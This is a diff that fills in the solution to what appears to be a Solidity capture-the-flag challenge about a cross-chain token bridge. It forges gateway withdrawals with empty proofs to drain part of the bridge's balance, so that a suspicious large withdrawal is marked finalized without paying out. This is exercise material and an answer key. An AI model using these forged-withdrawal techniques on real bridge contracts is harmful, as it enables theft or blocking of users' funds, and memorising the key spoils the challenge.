@@ -89,7 +89,53 @@ contract WithdrawalChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_withdrawal() public checkSolvedByPlayer {
-        // TODO: Complete solution
+        // Advance time past the delay for all logged timestamps
+        vm.warp(START_TIMESTAMP + 7 days + 1 hours);
+
+        // Reduce bridge balance below the suspicious withdrawal amount (but still above 99%)
+        _executeWithdrawal(deployer, 1_001e18, 99);
+
+        // Finalize all four withdrawals from the logs (mark as finalized)
+        _finalizeLoggedWithdrawal({
+            nonce: 0,
+            timestamp: 1718786915,
+            l2HandlerAddr: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            l1ForwarderAddr: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            l1TokenBridgeAddr: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50,
+            l2Sender: 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,
+            receiver: 0x328809Bc894f92807417D2dAD6b7C998c1aFdac6,
+            amount: 10e18
+        });
+        _finalizeLoggedWithdrawal({
+            nonce: 1,
+            timestamp: 1718786965,
+            l2HandlerAddr: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            l1ForwarderAddr: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            l1TokenBridgeAddr: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50,
+            l2Sender: 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
+            receiver: 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e,
+            amount: 10e18
+        });
+        _finalizeLoggedWithdrawal({
+            nonce: 2,
+            timestamp: 1718787050,
+            l2HandlerAddr: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            l1ForwarderAddr: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            l1TokenBridgeAddr: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50,
+            l2Sender: 0xea475d60c118d7058beF4bDd9c32bA51139a74e0,
+            receiver: 0xea475d60c118d7058beF4bDd9c32bA51139a74e0,
+            amount: 999_000e18
+        });
+        _finalizeLoggedWithdrawal({
+            nonce: 3,
+            timestamp: 1718787127,
+            l2HandlerAddr: 0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16,
+            l1ForwarderAddr: 0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5,
+            l1TokenBridgeAddr: 0x9c52B2C4A89E2BE37972d18dA937cbAd8AA8bd50,
+            l2Sender: 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,
+            receiver: 0x671d2ba5bF3C160A568Aae17dE26B51390d6BD5b,
+            amount: 10e18
+        });
     }
 
     /**
@@ -121,5 +167,44 @@ contract WithdrawalChallenge is Test {
             l1Gateway.finalizedWithdrawals(hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"),
             "Fourth withdrawal not finalized"
         );
+    }
+
+    function _finalizeLoggedWithdrawal(
+        uint256 nonce,
+        uint256 timestamp,
+        address l2HandlerAddr,
+        address l1ForwarderAddr,
+        address l1TokenBridgeAddr,
+        address l2Sender,
+        address receiver,
+        uint256 amount
+    ) private {
+        bytes memory msgToBridge = abi.encodeCall(TokenBridge.executeTokenWithdrawal, (receiver, amount));
+        bytes memory msgToForwarder =
+            abi.encodeCall(L1Forwarder.forwardMessage, (nonce, l2Sender, l1TokenBridgeAddr, msgToBridge));
+
+        l1Gateway.finalizeWithdrawal({
+            nonce: nonce,
+            l2Sender: l2HandlerAddr,
+            target: l1ForwarderAddr,
+            timestamp: timestamp,
+            message: msgToForwarder,
+            proof: new bytes32[](0)
+        });
+    }
+
+    function _executeWithdrawal(address receiver, uint256 amount, uint256 fwdNonce) private {
+        bytes memory msgToBridge = abi.encodeCall(TokenBridge.executeTokenWithdrawal, (receiver, amount));
+        bytes memory msgToForwarder =
+            abi.encodeCall(L1Forwarder.forwardMessage, (fwdNonce, l2Handler, address(l1TokenBridge), msgToBridge));
+
+        l1Gateway.finalizeWithdrawal({
+            nonce: fwdNonce,
+            l2Sender: l2Handler,
+            target: address(l1Forwarder),
+            timestamp: START_TIMESTAMP,
+            message: msgToForwarder,
+            proof: new bytes32[](0)
+        });
     }
 }
